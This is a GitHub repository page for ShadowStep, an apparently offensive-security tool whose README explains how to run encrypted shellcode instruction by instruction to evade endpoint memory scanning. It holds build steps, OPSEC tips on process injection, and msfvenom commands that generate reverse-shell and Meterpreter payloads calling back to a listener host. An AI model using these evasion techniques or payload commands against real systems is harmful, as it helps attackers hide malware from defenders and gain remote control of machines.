# https://github.com/jtalamini/shadowstep

[Skip to content](https://github.com/jtalamini/shadowstep#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/jtalamini/shadowstep) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/jtalamini/shadowstep) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/jtalamini/shadowstep) to refresh your session.Dismiss alert

{{ message }}

[jtalamini](https://github.com/jtalamini)/ **[shadowstep](https://github.com/jtalamini/shadowstep)** Public

- [Notifications](https://github.com/login?return_to=%2Fjtalamini%2Fshadowstep) You must be signed in to change notification settings
- [Fork\\
3](https://github.com/login?return_to=%2Fjtalamini%2Fshadowstep)
- [Star\\
14](https://github.com/login?return_to=%2Fjtalamini%2Fshadowstep)


In-memory Encrypted Shellcode Execution Suite


### License

[MIT license](https://github.com/jtalamini/shadowstep/blob/main/LICENSE)

[14\\
stars](https://github.com/jtalamini/shadowstep/stargazers) [3\\
forks](https://github.com/jtalamini/shadowstep/forks) [Branches](https://github.com/jtalamini/shadowstep/branches) [Tags](https://github.com/jtalamini/shadowstep/tags) [Activity](https://github.com/jtalamini/shadowstep/activity)

[Star](https://github.com/login?return_to=%2Fjtalamini%2Fshadowstep)

[Notifications](https://github.com/login?return_to=%2Fjtalamini%2Fshadowstep) You must be signed in to change notification settings

# jtalamini/shadowstep

main

[**1** Branch](https://github.com/jtalamini/shadowstep/branches) [**1** Tag](https://github.com/jtalamini/shadowstep/tags)

[Go to Branches page](https://github.com/jtalamini/shadowstep/branches)[Go to Tags page](https://github.com/jtalamini/shadowstep/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![jtalamini](https://avatars.githubusercontent.com/u/18089603?v=4&size=40)](https://github.com/jtalamini)[jtalamini](https://github.com/jtalamini/shadowstep/commits?author=jtalamini)<br>[Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28)<br>3 weeks agoJan 26, 2026<br>[f571df0](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28)¬†¬∑¬†3 weeks agoJan 26, 2026<br>## History<br>[1 Commit](https://github.com/jtalamini/shadowstep/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/jtalamini/shadowstep/commits/main/) 1 Commit |
| [ShadowStep.Compiler](https://github.com/jtalamini/shadowstep/tree/main/ShadowStep.Compiler "ShadowStep.Compiler") | [ShadowStep.Compiler](https://github.com/jtalamini/shadowstep/tree/main/ShadowStep.Compiler "ShadowStep.Compiler") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| [ShadowStep.Runtime](https://github.com/jtalamini/shadowstep/tree/main/ShadowStep.Runtime "ShadowStep.Runtime") | [ShadowStep.Runtime](https://github.com/jtalamini/shadowstep/tree/main/ShadowStep.Runtime "ShadowStep.Runtime") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| [.gitignore](https://github.com/jtalamini/shadowstep/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/jtalamini/shadowstep/blob/main/.gitignore ".gitignore") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| [LICENSE](https://github.com/jtalamini/shadowstep/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/jtalamini/shadowstep/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| [README.md](https://github.com/jtalamini/shadowstep/blob/main/README.md "README.md") | [README.md](https://github.com/jtalamini/shadowstep/blob/main/README.md "README.md") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| [ShadowStep.sln](https://github.com/jtalamini/shadowstep/blob/main/ShadowStep.sln "ShadowStep.sln") | [ShadowStep.sln](https://github.com/jtalamini/shadowstep/blob/main/ShadowStep.sln "ShadowStep.sln") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| [shadowstep.png](https://github.com/jtalamini/shadowstep/blob/main/shadowstep.png "shadowstep.png") | [shadowstep.png](https://github.com/jtalamini/shadowstep/blob/main/shadowstep.png "shadowstep.png") | [Initial commit](https://github.com/jtalamini/shadowstep/commit/f571df05e50a1da429e8d74ce303d17a25d7bd28 "Initial commit") | 3 weeks agoJan 26, 2026 |
| View all files |

## Repository files navigation

# ShadowStep

[Permalink: ShadowStep](https://github.com/jtalamini/shadowstep#shadowstep)

**In-memory Encrypted Shellcode Execution Suite**

ShadowStep is a research-oriented tool designed to execute an encrypted shellcode, ensuring that it is **never fully decrypted** in memory. At any given time, only a single instruction is available in plaintext, significantly reducing exposure to traditional memory-scanning techniques.

[![shadowstep](https://github.com/jtalamini/shadowstep/raw/main/shadowstep.png)](https://github.com/jtalamini/shadowstep/blob/main/shadowstep.png)

Many endpoint detection systems rely, among other techniques, on static memory pattern scanning to identify malicious payloads. ShadowStep mitigates this approach by decrypting, executing, and immediately re-encrypting shellcode instructions one at a time.

> ‚ö†Ô∏è This project is intended for research, educational, and defensive security purposes only.

## Index

[Permalink: Index](https://github.com/jtalamini/shadowstep#index)

- [Key Concept](https://github.com/jtalamini/shadowstep#key-concept)
- [Structure](https://github.com/jtalamini/shadowstep#structure)
- [Setup](https://github.com/jtalamini/shadowstep#setup)
  - [Requirements](https://github.com/jtalamini/shadowstep#requirements)
  - [CLI Setup](https://github.com/jtalamini/shadowstep#cli-setup)
  - [GUI Setup](https://github.com/jtalamini/shadowstep#gui-setup)
- [Troubleshooting](https://github.com/jtalamini/shadowstep#troubleshooting)
- [Usage](https://github.com/jtalamini/shadowstep#usage)
- [OPSEC](https://github.com/jtalamini/shadowstep#opsec)
- [Case Study](https://github.com/jtalamini/shadowstep#case-study)
- [Environment Cleanup](https://github.com/jtalamini/shadowstep#environment-cleanup)
- [Acknowledgements](https://github.com/jtalamini/shadowstep#acknowledgements)
- [Licensing](https://github.com/jtalamini/shadowstep#licensing)

## Key Concept

[Permalink: Key Concept](https://github.com/jtalamini/shadowstep#key-concept)

ShadowStep implements a custom single-step execution engine for encrypted shellcodes.
Instead of relying on exception handlers or CPU flags, it temporarily swaps the execution context of the host process with a virtual context in which the shellcode is executed instruction-by-instruction.
At no point does the full shellcode exist in decrypted form in memory.

This implementation focuses on an original approach and on reducing observable execution artifacts:

- No exception handler (VEH / SEH) registration required
- No need to configure specific flags
- More efficient than other single-step methods based on trap flag and exception handlers
- No suspicious behavior (HW/SW breakpoints, ...) commonly associated with debugging or emulation-based execution
- To the best of my knowledge, there are no inherent limitations on the opcodes that can be used by the shellcode

You might consider using this project if you have these objectives in mind:

- Apply an additional obfuscation layer to otherwise detectable or known payloads
- Integrate encrypted execution into an already developed custom loader
- Increase code resistance to static memory analysis
- Increase the effort required for reverse engineering

## Structure

[Permalink: Structure](https://github.com/jtalamini/shadowstep#structure)

> üöß This project is currently under development. Functionalities and documentation may change as the tool evolves.

The solution `ShadowStep` contains two Visual Studio projects:

- `ShadowStep.Compiler` used to build `ShadowStep.Compiler.exe`: this binary implements ShadowStep on a given shellcode.
- `ShadowStep.Runtime` used by `ShadowStep.Compiler.exe` to build your custom executable using ShadowStep.

## Setup

[Permalink: Setup](https://github.com/jtalamini/shadowstep#setup)

### Requirements

[Permalink: Requirements](https://github.com/jtalamini/shadowstep#requirements)

- Make sure you have **Visual Studio** installed on your Windows system with the **Desktop development with C++** workload.

### CLI Setup

[Permalink: CLI Setup](https://github.com/jtalamini/shadowstep#cli-setup)

1. Install vcpkg from the Command Line:

```
git clone https://github.com/microsoft/vcpkg.git
cd vcpkg
bootstrap-vcpkg.bat -disableMetrics
```

2. Install Capstone static library:

```
vcpkg install capstone[x86]:x64-windows-static
```

3. Add the integration for Visual Studio:

```
vcpkg integrate install
```

4. Open a Developer Command Prompt for VS. Build the ShadowStep Compiler using MSBuild:

```
git clone git@github.com:jtalamini/shadowstep.git
msbuild shadowstep\ShadowStep.Compiler\ShadowStep.Compiler.vcxproj /t:Clean,Build /p:Configuration=Release /p:Platform=x64
```

You might choose to build the project with Visual Studio as well.

### GUI Setup

[Permalink: GUI Setup](https://github.com/jtalamini/shadowstep#gui-setup)

1. Clone this repo:

```
git clone git@github.com:jtalamini/shadowstep.git
```

2. Download [Capstone](https://github.com/capstone-engine/capstone) and install it somewhere on your machine (e.g., C:\\libs\\capstone).

Open the solution in Visual Studio and configure the `ShadowStep.Compiler` project to use Capstone.

**3\. Add Capstone headers**

Navigate to:

```
(ShadowStep.Compiler) Project ‚Üí Properties ‚Üí C/C++ ‚Üí General ‚Üí Additional Include Directories
```

add the path to the include folder (e.g., C:\\libs\\capstone\\include).

**4\. Add the library to the linker**

Navigate to:

```
(ShadowStep.Compiler) Project ‚Üí Properties ‚Üí Linker ‚Üí General ‚Üí Additional Library Directories
```

add the path to the folder containing capstone.lib (e.g., C:\\libs\\capstone\\lib or C:\\libs\\capstone\\msvc)

**5\. Link the library**

Navigate to:

```
(ShadowStep.Compiler) Project ‚Üí Properties ‚Üí Linker ‚Üí Input ‚Üí Additional Dependencies
```

add the value `capstone.lib`

6. Finally, build the `ShadowStep.Compiler` project using Visual Studio.

## Troubleshooting

[Permalink: Troubleshooting](https://github.com/jtalamini/shadowstep#troubleshooting)

**MSB8020: Platform Toolset 'v143' cannot be found**

If you see an error like:

```
error MSB8020: The build tools for Visual Studio 2022 (Platform Toolset = 'v143') cannot be found.
To build using the v143 build tools, please install Visual Studio 2022 build tools.
Alternatively, you may upgrade to the current Visual Studio tools by selecting the Project menu
or right-click the solution, and then selecting "Retarget solution".
```

It usually means the project is targeting a Visual Studio toolset that is not installed on your machine.

**Solution 1**

Install the missing toolset (recommended if you want to keep v143):

Install Visual Studio 2022 (or the Visual Studio 2022 Build Tools) and ensure the Desktop development with C++ workload is enabled (MSVC v143, Windows SDK, MSBuild).

**Solution 2**

Retarget the solution to the toolset installed on your system:

Open the solution file (ShadowStep.sln) in Visual Studio.

When prompted, accept the Retarget action, or manually:

Right-click the solution in Solution Explorer ‚Üí Retarget solution
Select the installed Windows SDK/toolset version

## Usage

[Permalink: Usage](https://github.com/jtalamini/shadowstep#usage)

Open a Developer Command Prompt for VS.

Execute the ShadowStep Compiler:

```
.\ShadowStep.Compiler.exe <path-to-your-shellcode> <path-to-the-shadowstep-runtime-project-file>
```

The mandatory arguments are:

- `<path-to-your-shellcode>` is the path of a .bin file which contains your shellcode
- `<path-to-the-shadowstep-runtime-project-file>` is the full path of the `ShadowStep.Compiler\ShadowStep.Runtime.vcxproj` project file.

This generates a ready-to-use x64 executable file that implements ShadowStep on the given shellcode.
Since `ShadowStep.Compiler.exe` automatically builds the `ShadowStep.Runtime` project using _msbuild_, the resulting file should be under `ShadowStep.Runtime\x64\`.

> ‚ö†Ô∏è This project supports only x64 shellcodes as a design choice.

## OPSEC

[Permalink: OPSEC](https://github.com/jtalamini/shadowstep#opsec)

Detection of the artifacts generated using ShadowStep is _still possible_ for instance when used to obfuscate C2 payloads that rely on spawning new processes in which they write BOFs to execute them.

Since ShadowStep focuses on memory visibility reduction -- and not complete behavioral stealth -- some adjustments to the generated code might be needed for custom usage:

- The shellcode injection code uses standard Windows API but it can be customized.
- By default the shellcode is injected into the current process. Feel free to change `hProcess` in order to target a different process.
- ShadowStep currently supports only XOR and RC4 as encryption methods.

## Case Study

[Permalink: Case Study](https://github.com/jtalamini/shadowstep#case-study)

This suite was tested on the following _msfvenom_ payloads:

- `msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.bin`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.3 LPORT=9999 -f raw -o revshell.bin`
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f raw -o met.bin`

It was also tested on `Havoc C2` framework, but as already mentioned, since most agents execute BOFs and spawn a new process every time it is not possible to rely on ShadowStep to hide that kind of execution.

## Environment Cleanup

[Permalink: Environment Cleanup](https://github.com/jtalamini/shadowstep#environment-cleanup)

This section explains how to remove everything you installed to build ShadowStep, depending on the setup method you followed.

**Cleanup after CLI setup**

1. Remove the Capstone package:

```
vcpkg remove capstone[x86]:x64-windows-static
```

2. Undo Visual Studio integration:

```
vcpkg integrate remove
```

3. Delete the `vcpkg` folder you cloned.

4. Delete the `ShadowStep` folder you cloned.


**Cleanup after GUI setup**

If you manually downloaded and installed Capstone:

1. Delete the Capstone directory you placed on disk (e.g., `C:\libs\capstone\`).

2. Delete the `ShadowStep` folder you cloned.


## Acknowledgements

[Permalink: Acknowledgements](https://github.com/jtalamini/shadowstep#acknowledgements)

[Capstone](https://github.com/capstone-engine/capstone) developers for providing a powerful and well-designed disassembly framework that made this research possible.

[vari.sh](https://github.com/vari-sh) for the wonderful artwork and for providing valuable feedbacks during development.

[devisions](https://github.com/devisions) for supporting the development of this tool.

## Licensing

[Permalink: Licensing](https://github.com/jtalamini/shadowstep#licensing)

This project is licensed under the MIT License. See the accompanying [LICENSE](https://github.com/jtalamini/shadowstep/blob/main/LICENSE) file for more information.

## About

In-memory Encrypted Shellcode Execution Suite


### Resources

[Readme](https://github.com/jtalamini/shadowstep#readme-ov-file)

### License

[MIT license](https://github.com/jtalamini/shadowstep#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/jtalamini/shadowstep).

[Activity](https://github.com/jtalamini/shadowstep/activity)

### Stars

[**14**\\
stars](https://github.com/jtalamini/shadowstep/stargazers)

### Watchers

[**0**\\
watching](https://github.com/jtalamini/shadowstep/watchers)

### Forks

[**3**\\
forks](https://github.com/jtalamini/shadowstep/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fjtalamini%2Fshadowstep&report=jtalamini+%28user%29)

## [Releases\  1](https://github.com/jtalamini/shadowstep/releases)

[v0.1.0\\
Latest\\
\\
3 weeks agoJan 26, 2026](https://github.com/jtalamini/shadowstep/releases/tag/v0.1.0)

## [Packages\  0](https://github.com/users/jtalamini/packages?repo_name=shadowstep)

No packages published

## Languages

- [C++96.2%](https://github.com/jtalamini/shadowstep/search?l=c%2B%2B)
- [C3.8%](https://github.com/jtalamini/shadowstep/search?l=c)

You can‚Äôt perform that action at this time.